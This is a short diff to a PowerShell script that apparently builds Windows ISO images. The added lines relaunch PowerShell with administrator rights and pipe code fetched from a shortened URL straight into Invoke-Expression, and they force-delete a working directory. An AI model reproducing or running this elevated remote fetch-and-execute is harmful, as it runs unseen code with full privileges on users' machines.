@@ -1,4 +1,10 @@
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process -Verb runas -FilePath powershell.exe -ArgumentList "irm -Uri https://shorturl.at/xEFS6 | iex"
+    break
+}
+
 # Change to the desktop directory
+Remove-Item -Path "C:\Windows_iso_maker" -Recurse -Force | out-null
 
 mkdir "C:\Windows_iso_maker"
 
